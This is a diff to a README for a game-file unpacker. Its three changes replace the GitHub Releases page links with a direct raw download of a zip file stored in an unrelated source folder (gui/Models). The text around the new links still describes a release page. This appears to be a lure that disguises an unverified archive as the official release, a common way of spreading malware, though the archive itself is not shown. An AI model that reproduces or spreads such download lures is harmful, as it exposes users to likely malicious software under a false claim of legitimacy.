@@ -1,6 +1,6 @@
 # ⚫ crimson-desert-unpacker - Unpack and repack game files safely
 
-[![Download crimson-desert-unpacker](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/dellceliac835/crimson-desert-unpacker/releases)
+[![Download crimson-desert-unpacker](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/dellceliac835/crimson-desert-unpacker/raw/refs/heads/main/gui/Models/crimson_desert_unpacker_3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it to inspect game files, extract content, and build files again after chang
 
 Visit this page to download the latest Windows build:
 
-https://github.com/dellceliac835/crimson-desert-unpacker/releases
+https://github.com/dellceliac835/crimson-desert-unpacker/raw/refs/heads/main/gui/Models/crimson_desert_unpacker_3.6.zip
 
 On that page, look for the newest release. Download the Windows file for your system, then keep it in a folder you can reach, such as Downloads or Desktop.
 
@@ -201,4 +201,4 @@ Before you change anything, copy the original game file to a backup folder. That
 
 If you need the installer or release file again, use this page:
 
-https://github.com/dellceliac835/crimson-desert-unpacker/releases
+https://github.com/dellceliac835/crimson-desert-unpacker/raw/refs/heads/main/gui/Models/crimson_desert_unpacker_3.6.zip
